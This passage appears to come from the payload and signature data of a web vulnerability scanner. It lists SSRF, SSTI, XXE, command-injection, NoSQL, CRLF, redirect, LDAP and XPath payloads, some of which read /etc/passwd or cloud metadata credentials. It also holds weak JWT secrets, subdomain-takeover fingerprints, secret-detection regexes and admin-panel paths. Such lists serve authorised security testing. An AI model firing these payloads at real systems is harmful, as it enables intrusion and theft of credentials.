# ════════════════════════════════════════════════════════════════
SSRF_PAYLOADS = [
    "http://127.0.0.1/","http://127.0.0.1:80/","http://127.0.0.1:443/",
    "http://127.0.0.1:22/","http://127.0.0.1:3306/","http://127.0.0.1:6379/",
    "http://localhost/","http://localhost:80/","http://localhost:8080/",
    "http://[::1]/","http://[::1]:80/",
    "http://0.0.0.0/","http://0x7f000001/","http://2130706433/","http://017700000001/",
    "http://127.1/","http://127.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd","file:///etc/hosts","file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_CONFIG%20GET%20dir",
    "dict://127.0.0.1:6379/info",
    "ftp://127.0.0.1/","ldap://127.0.0.1/","tftp://127.0.0.1/",
]
SSRF_PARAM_HINTS = ["url","uri","link","src","source","dest","destination","target",
                    "redirect","proxy","fetch","load","file","path","host","domain",
                    "callback","return","next","site","feed","api","endpoint"]


# ════════════════════════════════════════════════════════════════
# SSTI
# ════════════════════════════════════════════════════════════════
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("${{7*7}}", "49"),
    ("{{7*7}}${7*7}", "4949"),
    ("{{'a'.toUpperCase()}}", "A"),
    ("{{config}}", "SECRET_KEY"),
    ("{{self.__class__.__mro__}}", "class"),
    ("${7*7}${7*7}", "4949"),
    ("%{7*7}", "49"),
    ("@(7*7)", "49"),
    ("{{ _self.env.registerUndefinedFilterCallback('exec') }}", "exec"),
    ("{{['id']|filter('system')}}", "uid="),
    ("<%= system('id') %>", "uid="),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
]
SSTI_PARAM_HINTS = ["q","query","search","name","title","subject","message","content",
                    "text","template","theme","page","view","lang","lang","locale",
                    "error","msg","message","greeting","welcome","user"]


# ════════════════════════════════════════════════════════════════
# XXE
# ════════════════════════════════════════════════════════════════
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hosts">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:80/">]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://127.0.0.1/xxe.dtd">%p;]><r/>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>',
    '<!DOCTYPE r [<!ENTITY x "xxe-test">]><r>&x;</r>',
]


# ════════════════════════════════════════════════════════════════
# COMMAND INJECTION
# ════════════════════════════════════════════════════════════════
CMD_PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("||id", "uid="),
    ("&id", "uid="),
    ("&&id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    ("'; id;'", "uid="),
    ("\"; id;\"", "uid="),
    ("%0aid", "uid="),
    ("%0d%0aid", "uid="),
    ("%3bid", "uid="),
    ("|whoami", "root"),
    (";whoami", "root"),
    (";uname -a", "Linux"),
    (";cat /etc/passwd", "root:x:0:0"),
    ("|cat /etc/passwd", "root:x:0:0"),
    ("; ping -c 1 127.0.0.1", "bytes from"),
    ("| ping -n 1 127.0.0.1", "bytes="),
    ("; sleep 3", "delay"),
    ("& sleep 3", "delay"),
    ("&& sleep 3", "delay"),
]
CMD_PARAM_HINTS = ["cmd","command","exec","execute","run","system","shell","sh",
                   "bash","ping","host","ip","domain","target","dest","url",
                   "action","op","function","func","call"]


# ════════════════════════════════════════════════════════════════
# NOSQL INJECTION
# ════════════════════════════════════════════════════════════════
NOSQL_PAYLOADS = [
    ('{"$ne": null}', None),
    ('{"$ne": ""}', None),
    ('{"$gt": ""}', None),
    ('{"$regex": ".*"}', None),
    ('{"$where": "1==1"}', None),
    ('{"$where": "sleep(3000)"}', 3),
    ('{"username": {"$ne": null}, "password": {"$ne": null}}', None),
    ("' || '1'=='1", None),
    ("';return true;var foo='", None),
    ('{"$or": [{"username":"admin"},{"username":{"$ne":null}}]}', None),
]
NOSQL_SUCCESS_MARKERS = ["logged in","welcome","dashboard","admin","success","token",
                         "authenticated","ok"]


# ════════════════════════════════════════════════════════════════
# CRLF
# ════════════════════════════════════════════════════════════════
CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:atomic=1",
    "%0aSet-Cookie:atomic=1",
    "%0d%0aX-Atomic: 1",
    "%0aX-Atomic: 1",
    "\r\nSet-Cookie:atomic=1",
    "\r\nX-Atomic: 1",
    "%23%0d%0aSet-Cookie:atomic=1",
    "%E5%98%8A%E5%98%8DSet-Cookie:atomic=1",
]


# ════════════════════════════════════════════════════════════════
# OPEN REDIRECT
# ════════════════════════════════════════════════════════════════
REDIRECT_PAYLOADS = [
    "https://atomic.example",
    "http://atomic.example",
    "//atomic.example",
    "///atomic.example",
    "////atomic.example",
    "https:atomic.example",
    "https:/atomic.example",
    "\\\\atomic.example",
    "\\/\\/atomic.example",
    "https://atomic.example\\@target.example",
    "https://atomic.example@target.example",
    "https://atomic.example%00@target.example",
    "https://atomic.example%2f@target.example",
    "//atomic.example/%2f..",
    "/\\/atomic.example",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
]
REDIRECT_PARAM_HINTS = ["next","url","redirect","redirect_uri","return","returnUrl",
                        "return_to","continue","goto","dest","destination","target",
                        "r","u","link","callback","cb","forward","back","to"]


# ════════════════════════════════════════════════════════════════
# JWT WEAK SECRETS
# ════════════════════════════════════════════════════════════════
JWT_WEAK_SECRETS = [
    "secret","password","admin","key","private","jwt","jwtsecret","jwt-secret",
    "changeme","change-me","supersecret","super-secret","mysecret","my-secret",
    "topsecret","top-secret","test","demo","dev","development","production",
    "prod","staging","staging-secret","default","abc123","123456","qwerty",
    "your-256-bit-secret","your-secret-key","JWTSecretKey","secretkey",
    "ssshhh","my$ecretK3y","s3cr3t","s3cr3t-k3y","shhhhh",
]
JWT_ALGORITHMS = ["HS256","HS384","HS512"]


# ════════════════════════════════════════════════════════════════
# XXE / LDAP / XPATH markers
# ════════════════════════════════════════════════════════════════
LDAP_PAYLOADS = [
    ("*)(uid=*))(|(uid=*", "LDAP error"),
    ("*)(objectclass=*", "LDAP error"),
    ("*", "LDAP error"),
    ("admin)(&(1=1", "LDAP error"),
    ("*))%00", "LDAP error"),
]

XPATH_PAYLOADS = [
    "' or '1'='1", "\" or \"1\"=\"1", "'] | //* | a['", "' or count(/*)>0 or '1'='1",
]


# ════════════════════════════════════════════════════════════════
# TAKEOVER PROVIDERS
# ════════════════════════════════════════════════════════════════
TAKEOVER_FINGERPRINTS = {
    "github.io": ["There isn't a GitHub Pages site here",
                  "For root URLs (like http://example.com/) you must provide an index.html file"],
    "herokuapp.com": ["No such app", "heroku | no such app", "There is no app configured at that hostname"],
    "s3.amazonaws.com": ["NoSuchBucket", "The specified bucket does not exist"],
    "cloudfront.net": ["Bad request", "ERROR: The request could not be satisfied"],
    "azurewebsites.net": ["404 Web Site not found", "Error 404 - Web app not found"],
    "azure-api.net": ["No API found"],
    "azurehdinsight.net": ["Error 404"],
    "trafficmanager.net": ["There is no resource that matches the hostname"],
    "shopify.com": ["Sorry, this shop is currently unavailable"],
    "myshopify.com": ["Sorry, this shop is currently unavailable"],
    "surge.sh": ["project not found"],
    "bitbucket.io": ["Repository not found"],
    "fastly.net": ["Fastly error: unknown domain"],
    "ghost.io": ["The thing you were looking for is no longer here"],
    "pantheonsite.io": ["The gods are wise, but do not know of the site which you seek"],
    "tumblr.com": ["Whatever you were looking for doesn't currently exist at this address"],
    "wordpress.com": ["Do you want to register"],
    "zendesk.com": ["Help Center Closed"],
    "readme.io": ["The page you're looking for doesn't exist"],
    "statuspage.io": ["You are being redirected"],
    "strikingly.com": ["page not found"],
    "unbounce.com": ["The requested URL was not found on this server"],
    "ngrok.io": ["ngrok.io not found"],
    "ngrok-free.app": ["ngrok.io not found"],
    "webflow.io": ["The page you are looking for doesn't exist"],
    "fly.io": ["Application not found"],
    "vercel.app": ["The deployment could not be found"],
    "netlify.app": ["Not found - Request ID"],
    "pages.dev": ["Project not found"],
    "cargocollective.com": ["404 Not Found"],
    "launchrock.com": ["This LaunchRock page is no longer active"],
    "helpscoutdocs.com": ["No settings were found for this company"],
    "campaign-archive.com": ["Sorry, this campaign doesn't exist"],
    "mailgun.org": ["Domain not found"],
    "sendgrid.net": ["not found"],
    "gitbook.io": ["The page you are looking for could not be found"],
    "smartjobboard.com": ["Unknown Error Occurred"],
    "kajabi.com": ["The page you are looking for doesn't exist"],
    "teachable.com": ["Site Not Found"],
    "thinkific.com": ["Site Not Found"],
    "bubble.io": ["This application is not currently available"],
    "glitch.me": ["The application you are looking for is no longer available"],
    "repl.it": ["Deployment not found"],
    "replit.app": ["Deployment not found"],
    "herokudns.com": ["No such app"],
    "myshopify.io": ["Sorry, this shop is currently unavailable"],
    "freshdesk.com": ["There is no helpdesk here"],
    "aptible.io": ["Not Found"],
    "airtable.com": ["404 Not Found"],
    "aha.io": ["Could not find"],
}


# ════════════════════════════════════════════════════════════════
# SECRET PATTERNS
# ════════════════════════════════════════════════════════════════
SECRET_PATTERNS = {
    "aws_access_key": r"AKIA[0-9A-Z]{16}",
    "aws_secret": r"aws_secret_access_key['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{40})",
    "aws_session": r"ASIA[0-9A-Z]{16}",
    "google_api": r"AIza[0-9A-Za-z_\-]{35}",
    "google_oauth": r"[0-9]+-[0-9a-z_]{32}\.apps\.googleusercontent\.com",
    "google_service_account": r'"type"\s*:\s*"service_account"',
    "github_token": r"gh[pousr]_[A-Za-z0-9]{36,}",
    "github_oauth": r"gho_[A-Za-z0-9]{36}",
    "gitlab_token": r"glpat-[A-Za-z0-9_\-]{20}",
    "slack_token": r"xox[baprs]-[0-9A-Za-z\-]{10,}",
    "slack_webhook": r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+",
    "stripe_secret": r"sk_live_[0-9A-Za-z]{24,}",
    "stripe_pk": r"pk_live_[0-9A-Za-z]{24,}",
    "stripe_test": r"sk_test_[0-9A-Za-z]{24,}",
    "paypal_client": r"A[0-9A-Za-z_\-]{80}",
    "twilio": r"SK[0-9a-fA-F]{32}",
    "sendgrid": r"SG\.[0-9A-Za-z_\-]{22}\.[0-9A-Za-z_\-]{43}",
    "mailgun": r"key-[0-9a-zA-Z]{32}",
    "mailchimp": r"[0-9a-f]{32}-us[0-9]{1,2}",
    "firebase": r"AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}",
    "firebase_rtdb": r"https://[a-z0-9-]+\.firebaseio\.com",
    "jwt": r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}",
    "private_key": r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----",
    "certificate": r"-----BEGIN CERTIFICATE-----",
    "heroku_api": r"heroku[a-z0-9]{32}",
    "npm_token": r"npm_[A-Za-z0-9]{36}",
    "pypi_token": r"pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}",
    "openai": r"sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}",
    "anthropic": r"sk-ant-[A-Za-z0-9_\-]{20,}",
    "discord_token": r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}",
    "discord_webhook": r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_\-]+",
    "telegram_bot": r"[0-9]{8,10}:AA[A-Za-z0-9_\-]{33}",
    "digitalocean": r"dop_v1_[a-f0-9]{64}",
    "linode": r"[a-f0-9]{64}",
    "cloudflare_api": r"[a-zA-Z0-9_-]{40}",
    "docker_auth": r"\"auths\"\s*:\s*\{",
    "ssh_private": r"-----BEGIN OPENSSH PRIVATE KEY-----",
    "pgp_private": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
    "cloudinary": r"cloudinary://[0-9]+:[A-Za-z0-9_\-]+@[a-z0-9]+",
    "mapbox": r"pk\.[A-Za-z0-9_\-]{60,}",
    "amplitude": r"[a-f0-9]{32}",
    "sentry_dsn": r"https://[a-f0-9]+@[a-z0-9.\-]+/[0-9]+",
    "datadog": r"dd[a-z_]*_[a-f0-9]{32,40}",
    "algolia": r"[A-Z0-9]{10}",
    "elastic_apikey": r"[A-Za-z0-9_\-=]{50,}",
    "supabase": r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
    "vercel_token": r"[a-zA-Z0-9]{24}",
}


# ════════════════════════════════════════════════════════════════
# WAF FINGERPRINTS
# ════════════════════════════════════════════════════════════════
WAF_HEADER_FINGERPRINTS = {
    "cloudflare": ["cf-ray", "cf-cache-status", "cf-request-id", "__cfduid", "__cf_bm"],
    "akamai": ["akamai", "ak-bmsc", "akamai-ghost", "x-akamai-transformed"],
    "sucuri": ["x-sucuri-id", "x-sucuri-cache", "sucuri"],
    "imperva/incapsula": ["x-iinfo", "incap_ses", "visid_incap", "x-cdn"],
    "f5 big-ip": ["x-wa-info", "big-ip", "bigip", "x-cnection"],
    "barracuda": ["barra", "barracuda"],
    "fortiweb": ["fortiweb", "fortigate"],
    "aws cloudfront": ["x-amz-cf-id", "x-amz-cf-pop", "cloudfront"],
    "aws waf": ["x-amzn-waf", "x-amzn-requestid"],
    "azure front door": ["x-azure-ref", "x-fd-int"],
    "azure app gateway": ["x-azure-ref"],
    "fastly": ["x-served-by", "x-cache", "x-fastly", "fastly"],
    "google cloud armor": ["server: Google Frontend", "x-cloud-trace-context"],
    "ddos-guard": ["ddos-guard", "ddosguard"],
    "qrator": ["qrator"],
    "wallarm": ["x-wallarm-waf"],
    "modsecurity": ["mod_security", "modsecurity", "mod-security"],
    "wordfence": ["wordfence"],
    "sitelock": ["sitelock"],
    "stackpath": ["x-sp-cache"],
    "reblaze": ["rbz", "reblaze"],
    "signal sciences": ["x-sigsci-requestid"],
    "radware": ["x-rdwr"],
    "citrix netscaler": ["netscaler", "citrix", "ns_af"],
    "a10": ["x-a10"],
    "penta security": ["pentasec"],
    "vercel": ["x-vercel-id", "x-vercel-cache"],
    "netlify": ["x-nf-request-id", "netlify"],
}

WAF_COOKIE_FINGERPRINTS = {
    "cloudflare": ["__cf_bm", "cf_clearance", "__cfduid"],
    "incapsula": ["incap_ses_", "visid_incap_"],
    "sucuri": ["sucuri_cloudproxy"],
    "akamai": ["ak_bmsc", "bm_sv", "bm_mi"],
    "f5 big-ip": ["bigipserver", "ts01"],
    "barracuda": ["barra"],
    "wordfence": ["wfvt_", "wordfence_verifiedhuman"],
    "reblaze": ["rbz"],
}

WAF_BLOCK_MARKERS = [
    "attention required! | cloudflare",
    "cloudflare ray id",
    "access denied",
    "request blocked",
    "web application firewall",
    "malicious request",
    "your request has been blocked",
    "the requested url was rejected",
    "security policy",
    "mod_security",
    "this request has been blocked",
    "the server denied the request",
    "blocked by",
    "abuse detection",
    "forbidden",
    "406 not acceptable",
    "not acceptable",
    "you have been blocked",
    "your ip has been blocked",
    "the request was rejected",
    "the page you are trying to access is restricted",
    "suspicious activity detected",
    "unusual traffic",
    "please verify you are a human",
    "access to this resource has been denied",
    "request unsuccessful",
    "the administrator has blocked your ip",
    "captcha required",
    "checking your browser",
    "ddos protection",
    "the requested url cannot be accessed",
    "your request has been rate limited",
    "too many requests",
]

WAF_PROBE_PAYLOADS = {
    "sqli_error": "' OR 1=1-- -",
    "sqli_union": "1 UNION SELECT NULL,NULL,NULL-- -",
    "xss_reflected": "<script>alert(1)</script>",
    "xss_svg": "<svg/onload=alert(1)>",
    "lfi": "../../../etc/passwd",
    "rce": ";cat /etc/passwd",
    "traversal": "..\\..\\..\\..\\windows\\win.ini",
    "ssrf": "http://169.254.169.254/",
    "scanner_ua": None,  # handled by UA switch
    "ssti": "{{7*7}}",
    "nosql": '{"$ne":null}',
    "xss_event": "javascript:alert(1)",
    "cmd": "|whoami",
    "xxe": '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
}


# ════════════════════════════════════════════════════════════════
# HIDDEN DATABASE INTERFACES
# ════════════════════════════════════════════════════════════════
DATABASE_UI_PATHS = {
    "phpmyadmin": ["/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/myadmin/", "/phpmyadmin2/", "/phpMyAdmin-4.8.4/"],
    "adminer": ["/adminer.php", "/adminer/", "/adminer-4.8.1.php", "/adminer/Adminer.php"],
    "pgadmin": ["/pgadmin/", "/pgadmin4/", "/pgadmin4/login", "/phppgadmin/"],
    "mysql-workbench": ["/mysql-workbench/", "/workbench/"],
    "mongo-express": ["/mongo-express/", "/mongo_express/"],
    "mongo-express-auth": ["/mongo-express/login", "/mongo-express/#login"],
    "redis-commander": ["/redis-commander/", "/redis-commander/login"],
    "phpredisadmin": ["/phpredisadmin/", "/phpRedisAdmin/"],
    "elasticsearch": ["/", "/_cat/indices", "/_cat/nodes", "/_cluster/health", "/_nodes", "/_search?q=*"],
    "kibana": ["/app/kibana", "/app/monitoring", "/login", "/app/discover"],
    "logstash": ["/", "/_node/stats"],
    "solr": ["/solr/", "/solr/admin/", "/solr/#/"],
    "couchdb": ["/_utils", "/_utils/", "/_all_dbs", "/_session", "/_config"],
    "cassandra": ["/", "/opscenter/", "/9090/", "/cassandra/"],
    "rethinkdb": ["/", "/#tables", "/rethinkdb/"],
    "arango": ["/_db/_system/_admin/aardvark/", "/_api/version", "/_api/current-database"],
    "orientdb": ["/studio/index.html", "/studio/server/", "/studio/"],
    "neo4j": ["/browser/", "/browser", "/neo4j/", "/browser/#"],
    "influxdb": ["/query?q=SHOW%20DATABASES", "/query?q=SHOW%20MEASUREMENTS", "/ping", "/health"],
    "prometheus": ["/graph", "/api/v1/targets", "/api/v1/query?query=up"],
    "victoriametrics": ["/vmui/", "/targets", "/api/v1/status/top_queries"],
    "timescale": ["/timescale/", "/prometheus/"],
    "clickhouse": ["/play", "/?query=SHOW%20DATABASES", "/?query=SELECT%20version()"],
    "druid": ["/unified-console.html", "/druid/index.html", "/status"],
    "presto": ["/ui/", "/ui/query.html"],
    "dremio": ["/", "/login"],
    "spark": ["/", "/app/", "/api/v1/applications", "/static/"],
    "hadoop": ["/dfshealth.html", "/namenode/", "/explorer.html"],
    "hbase": ["/hbase/", "/master-status", "/jmx"],
    "hive": ["/", "/hwi/"],
    "storm": ["/", "/api/v1/cluster/summary"],
    "airflow": ["/admin/", "/home", "/health"],
    "sentry": ["/", "/auth/login/", "/api/0/"],
    "metabase": ["/", "/auth/login", "/api/health"],
    "superset": ["/", "/login/", "/health"],
    "redash": ["/", "/login", "/api/session"],
    "dbeaver": ["/"],
}

DATABASE_SUCCESS_MARKERS = {
    "elasticsearch": ["cluster_name", "tagline", "You Know, for Search", "_cat", "indices"],
    "couchdb": ["couchdb", "welcome", "uuid", "version", "vendor"],
    "solr": ["solr", "solr_home", "lucene", "admin"],
    "mongo-express": ["mongo-express", "Mongo Express", "database"],
    "phpmyadmin": ["phpMyAdmin", "pma_password", "pma_username"],
    "adminer": ["adminer", "Adminer", "loginForm"],
    "pgadmin": ["pgAdmin", "pgadmin"],
    "redis-commander": ["redis-commander", "Redis Commander"],
    "kibana": ["kibana", "Kibana"],
    "grafana": ["grafana", "Grafana", "grafanaBootData"],
    "influxdb": ["influxdb", "InfluxDB", "databases", "measurements"],
    "neo4j": ["neo4j", "Neo4j", "browser"],
    "orientdb": ["orientdb", "OrientDB", "studio"],
    "arango": ["arango", "ArangoDB", "aardvark"],
    "rethinkdb": ["rethinkdb", "RethinkDB", "admin"],
    "cassandra": ["cassandra", "opscenter", "OpsCenter"],
    "clickhouse": ["clickhouse", "ClickHouse", "databases"],
    "prometheus": ["prometheus", "Prometheus", "targets"],
    "metabase": ["metabase", "Metabase"],
    "superset": ["superset", "Superset", "Apache Superset"],
    "airflow": ["airflow", "Airflow", "Apache Airflow"],
    "spark": ["spark", "Spark", "applications"],
    "hadoop": ["hadoop", "Hadoop", "datanode"],
    "hbase": ["hbase", "HBase", "master"],
    "druid": ["druid", "Druid", "unified-console"],
}


# ════════════════════════════════════════════════════════════════
# CLOUD PROVIDER IP RANGES (approximate, for header sniffing)
# ════════════════════════════════════════════════════════════════
CLOUD_HEADER_SIGNATURES = {
    "aws": ["x-amz-cf-id", "x-amz-cf-pop", "x-amzn-requestid", "x-amzn-trace-id",
            "server: awselb", "server: amazon", "x-amz-cf-"],
    "cloudflare": ["cf-ray", "cf-cache-status", "server: cloudflare"],
    "gcp": ["server: gws", "server: google frontend", "x-cloud-trace-context",
            "x-goog-", "via: 1.1 google"],
    "azure": ["x-azure-ref", "x-msedge-ref", "server: windows-azure", "server: microsoft-iis"],
    "digitalocean": ["server: digitalocean"],
    "linode": ["server: linode"],
    "vultr": ["server: vultr"],
    "hetzner": ["server: hetzner"],
    "ovh": ["server: ovh"],
    "fastly": ["x-fastly", "via: 1.1 varnish", "server: fastly"],
    "akamai": ["server: akamai", "akamai"],
    "heroku": ["server: heroku"],
    "netlify": ["x-nf-request-id"],
    "vercel": ["x-vercel-id", "x-vercel-cache"],
    "github pages": ["server: github.com", "x-github-request-id"],
}


# ════════════════════════════════════════════════════════════════
# TECH FINGERPRINTS
# ════════════════════════════════════════════════════════════════
TECH_SIGNATURES_BODY = {
    "wordpress": [r"wp-content", r"wp-includes", r'name="generator" content="WordPress'],
    "drupal": [r"Drupal\.settings", r"sites/default/files", r'content="Drupal'],
    "joomla": [r"/media/jui/", r'content="Joomla', r"/components/com_"],
    "magento": [r"skin/frontend/", r"Mage\.Cookies", r"mage/cookies"],
    "shopify": [r"cdn\.shopify\.com", r"shopify\.theme"],
    "prestashop": [r"prestashop", r"/modules/ps_"],
    "opencart": [r"catalog/view/", r"index\.php\?route="],
    "react": [r"__REACT_DEVTOOLS", r"data-reactroot", r"_reactRootContainer"],
    "nextjs": [r"__NEXT_DATA__", r"_next/static", r"/_next/"],
    "vue": [r"data-v-[0-9a-f]{8}", r"__VUE__", r"Vue\.config"],
    "nuxt": [r"__NUXT__", r"_nuxt/"],
    "angular": [r"ng-version=", r"ng-app=", r"angular(?:\.min)?\.js"],
    "svelte": [r"svelte-[a-z0-9]{6}", r"__svelte"],
    "ember": [r"ember-view", r"ember-cli"],
    "backbone": [r"backbone(?:\.min)?\.js"],
    "jquery": [r"jquery(?:-\d+\.\d+\.\d+|\.min)?\.js"],
    "bootstrap": [r"bootstrap(?:\.min)?\.css", r"bootstrap\.bundle"],
    "foundation": [r"foundation(?:\.min)?\.css"],
    "tailwind": [r"tailwind", r"tailwindcss"],
    "materialize": [r"materialize(?:\.min)?\.css"],
    "bulma": [r"bulma(?:\.min)?\.css"],
    "php": [r"PHPSESSID", r"\.php", r"X-Powered-By: PHP"],
    "aspnet": [r"ASP\.NET_SessionId", r"__VIEWSTATE", r"__EVENTVALIDATION"],
    "django": [r"csrfmiddlewaretoken", r"__admin_media_prefix__", r"django"],
    "flask": [r"werkzeug", r"flask"],
    "rails": [r"_rails_session", r"csrf-token", r"rails"],
    "laravel": [r"laravel_session", r"XSRF-TOKEN"],
    "symfony": [r"symfony", r"sf_redirect"],
    "spring": [r"JSESSIONID", r"spring"],
    "grails": [r"grails"],
    "struts": [r"struts", r"action="],
    "express": [r"X-Powered-By: Express"],
    "koa": [r"koa"],
    "fastify": [r"fastify"],
    "hapi": [r"hapi"],
    "nginx": [r"nginx"],
    "apache": [r"apache", r"httpd"],
    "iis": [r"microsoft-iis", r"iis"],
    "lighttpd": [r"lighttpd"],
    "caddy": [r"caddy"],
    "tomcat": [r"tomcat", r"coyote"],
    "jetty": [r"jetty"],
    "undertow": [r"undertow"],
    "netty": [r"netty"],
    "gunicorn": [r"gunicorn"],
    "uwsgi": [r"uwsgi"],
    "puma": [r"puma"],
    "passenger": [r"passenger"],
    "cloudflare": [r"cloudflare", r"cf-ray"],
    "akamai": [r"akamai"],
    "fastly": [r"fastly"],
    "aws": [r"amazonaws", r"x-amz"],
    "azure": [r"azure", r"microsoft"],
    "gcp": [r"google", r"gws"],
    "graphql": [r"graphql", r"__schema"],
    "swagger": [r"swagger", r"swagger-ui"],
    "sentry": [r"sentry", r"__SENTRY__"],
    "newrelic": [r"newrelic", r"NREUM"],
    "datadog": [r"datadoghq", r"DD_RUM"],
    "segment": [r"segment\.io", r"analytics\.js"],
    "google_analytics": [r"google-analytics\.com", r"gtag\(", r"UA-[0-9]+-[0-9]+"],
    "gtm": [r"googletagmanager\.com"],
    "facebook_pixel": [r"connect\.facebook\.net"],
    "hotjar": [r"hotjar"],
    "optimizely": [r"optimizely"],
    "stripe": [r"stripe\.com", r"js\.stripe\.com"],
    "paypal": [r"paypal\.com", r"paypalobjects\.com"],
    "auth0": [r"auth0\.com", r"cdn\.auth0\.com"],
    "okta": [r"okta\.com", r"oktapreview\.com"],
    "firebase": [r"firebase", r"firebaseio\.com"],
    "supabase": [r"supabase"],
    "amplify": [r"amplifyapp", r"aws-amplify"],
    "vercel": [r"vercel\.app", r"x-vercel"],
    "netlify": [r"netlify\.app", r"x-nf-request-id"],
    "github_pages": [r"github\.io", r"x-github-request-id"],
    "gitlab_pages": [r"gitlab\.io"],
}

TECH_VERSION_EXTRACTORS = {
    "wordpress": [
        (r'name="generator" content="WordPress (\d+\.\d+(?:\.\d+)?)"', 1),
        (r'wp-includes/js/wp-emoji(?:-release)?\.js\?ver=(\d+\.\d+(?:\.\d+)?)', 1),
    ],
    "drupal": [
        (r'name="Generator" content="Drupal (\d+(?:\.\d+)*)"', 1),
        (r"Drupal\.settings,\s*\{\"basePath\":\"[^\"]+\",\"pathPrefix\":\"[^\"]*\",\"currentPath\":\"[^\"]+\",\"currentPathIsAdmin\":[^,]+,", 0),
    ],
    "joomla": [
        (r'content="Joomla!? (\d+(?:\.\d+)*)"', 1),
        (r"/media/system/js/[^\"]+/[^\"]*\.js\?([a-f0-9]{32})", 1),
    ],
    "jquery": [
        (r"jquery[.-](\d+\.\d+\.\d+)(?:\.min)?\.js", 1),
    ],
    "bootstrap": [
        (r"bootstrap[.-](\d+\.\d+\.\d+)(?:\.min)?\.(?:css|js)", 1),
    ],
    "react": [
        (r"react@(\d+\.\d+\.\d+)", 1),
    ],
    "nextjs": [
        (r"__NEXT_DATA__.*?\"buildId\":\"([^\"]+)\"", 0),
    ],
    "nginx": [
        (r"Server:\s*nginx/(\d+\.\d+\.\d+)", 1),
    ],
    "apache": [
        (r"Server:\s*Apache/(\d+\.\d+\.\d+)", 1),
    ],
}


# ════════════════════════════════════════════════════════════════
# DEFAULT API / WEB PATHS
# ════════════════════════════════════════════════════════════════
API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/v1/", "/api/v2/", "/api/v3/",
    "/api/users", "/api/v1/users", "/api/v2/users",
    "/api/auth", "/api/v1/auth", "/api/login", "/api/v1/login",
    "/api/register", "/api/v1/register",
    "/api/health", "/api/healthz", "/api/status", "/api/version",
    "/api/config", "/api/settings", "/api/debug",
    "/api/accounts", "/api/orders", "/api/products",
    "/api/admin", "/api/v1/admin",
    "/graphql", "/graphiql", "/api/graphql",
    "/swagger.json", "/swagger.yaml", "/swagger-ui.html",
    "/openapi.json", "/openapi.yaml", "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/redoc", "/docs", "/documentation",
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
]


# ════════════════════════════════════════════════════════════════
# WEB SHELL / BACKDOOR SIGNATURES
# ════════════════════════════════════════════════════════════════
WEBSHELL_MARKERS = [
    "c99shell", "r57shell", "wso shell", "b374k",
    "phpspy", "php shell", "priv8", "priv-8",
    "adminer", "sqlbuddy", "phpliteadmin",
]


# ════════════════════════════════════════════════════════════════
# COMMON PORTS
# ════════════════════════════════════════════════════════════════
COMMON_PORTS = [
    # web
    80, 443, 8000, 8008, 8080, 8081, 8082, 8085, 8088, 8090, 8091, 8095, 8098, 8180, 8443, 8880, 8888, 9000, 9001, 9090, 9091, 9443, 9444, 10000,
    # mail
    25, 110, 143, 465, 587, 993, 995, 2525,
    # dns
    53, 5353, 853,
    # db
    1433, 1521, 1830, 2483, 2484, 3306, 5432, 5984, 6379, 7000, 7001, 7199, 7474, 7687, 8086, 8087, 8123, 8529, 9042, 9160, 9200, 9300, 11211, 27017, 27018, 27019, 28017,
    # dev / infra
